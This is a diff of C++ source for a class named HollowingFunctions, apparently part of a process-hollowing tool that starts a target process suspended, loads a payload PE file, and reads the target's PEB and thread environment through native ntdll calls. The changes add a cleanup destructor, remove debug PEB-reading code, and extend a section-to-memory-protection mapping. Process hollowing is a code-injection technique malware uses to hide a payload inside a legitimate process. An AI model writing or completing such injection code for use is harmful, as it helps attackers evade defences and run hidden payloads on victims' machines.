@@ -560,12 +560,19 @@ protected:
     bool _isPayload64Bit;
 
 public:
-
     HollowingFunctions(const std::string& targetPath, const std::string& payloadPath) :
         _targetFilePath(targetPath), _payloadFilePath(payloadPath), _targetProcessInformation(CreateSuspendedTargetProcess()),
         _payloadBuffer(ReadFileContents(payloadPath, _payloadBufferSize)),
         _isTarget64Bit(IsProcess64Bit(_targetProcessInformation.hProcess)), _isPayload64Bit(IsPEFile64Bit(_payloadBuffer))
     { }
+
+    ~HollowingFunctions()
+    {
+        delete[] _payloadBuffer;
+        
+        CloseHandle(_targetProcessInformation.hProcess);
+        CloseHandle(_targetProcessInformation.hThread);
+    }
 
     virtual void hollow() = 0;
 
@@ -613,53 +620,6 @@ public:
     
     PEB32 Read32BitProcessPEB(HANDLE process)
     {
-        /* PROCESS_BASIC_INFORMATION targetBasicInformation;
-        DWORD returnLength = 0;
-
-        if (ERROR_SUCCESS != NtdllFunctions::_NtQueryInformationProcess(process, ProcessBasicInformation,
-            &targetBasicInformation, sizeof(targetBasicInformation), &returnLength))
-        {
-            std::cout << "87" << std::endl;
-        }
-        
-        PEB32 processPEB;
-        if (0 == ReadProcessMemory(process, targetBasicInformation.PebBaseAddress + 0x1000, &processPEB,
-            sizeof(processPEB), nullptr))
-        {
-            std::cout << "186: " << GetLastError() << std::endl;
-            // Exception
-        }
-
-        return processPEB; */
-
-        THREAD_BASIC_INFORMATION tbi;
-        NTSTATUS ntrv;
-        TEB32 teb32;
-        void *teb32addr;
-        PEB32 peb32;
-        size_t bytes_read;
-
-        if (ERROR_SUCCESS != NtdllFunctions::_NtQueryInformationThread(_targetProcessInformation.hThread, ThreadBasicInformation, &tbi, sizeof(tbi), nullptr))
-        {
-            std::cout << "88" << std::endl;
-        }
-
-        teb32addr = (PBYTE)tbi.TebBaseAddress + 0x2000;
-        ntrv = NtdllFunctions::_NtReadVirtualMemory(_targetProcessInformation.hProcess, teb32addr, &teb32, sizeof(teb32), nullptr);
-        if(ntrv != 0 || teb32.NtTib.Self != (intptr_t)teb32addr)
-        {
-            std::cout << "95" << std::endl;
-        }
-
-        if(ERROR_SUCCESS != NtdllFunctions::_NtReadVirtualMemory(_targetProcessInformation.hProcess, (PVOID)teb32.ProcessEnvironmentBlock, &peb32, sizeof(peb32), NULL))
-        {
-            std::cout << "100" << std::endl;
-        }
-
-        
-
-
-
         PEB32 processPEB;
         WOW64_CONTEXT threadContext;
         threadContext.ContextFlags = WOW64_CONTEXT_INTEGER;
@@ -707,21 +667,25 @@ public:
 
     DWORD SectionCharacteristicsToMemoryProtections(DWORD characteristics)
     {
-        if (characteristics & IMAGE_SCN_MEM_EXECUTE && characteristics & IMAGE_SCN_MEM_READ && characteristics & IMAGE_SCN_MEM_WRITE)
+        if (IMAGE_SCN_MEM_EXECUTE & characteristics && IMAGE_SCN_MEM_READ & characteristics && IMAGE_SCN_MEM_WRITE & characteristics)
         {
             return PAGE_EXECUTE_READWRITE;
         }
-        else if (characteristics & IMAGE_SCN_MEM_EXECUTE && characteristics & IMAGE_SCN_MEM_READ)
+        else if (IMAGE_SCN_MEM_EXECUTE & characteristics && IMAGE_SCN_MEM_READ & characteristics)
         {
             return PAGE_EXECUTE_READ;
         }
-        else if (characteristics & IMAGE_SCN_MEM_READ && characteristics & IMAGE_SCN_MEM_WRITE)
+        else if (IMAGE_SCN_MEM_READ & characteristics && IMAGE_SCN_MEM_WRITE & characteristics)
         {
             return PAGE_READWRITE;
         }
-        else if (characteristics & IMAGE_SCN_MEM_READ)
+        else if (IMAGE_SCN_MEM_READ & characteristics)
         {
             return PAGE_READONLY;
+        }
+        else if (IMAGE_SCN_MEM_EXECUTE & characteristics)
+        {
+            return PAGE_EXECUTE;
         }
 
         std::cout << "313 Should not happen!" << std::endl;
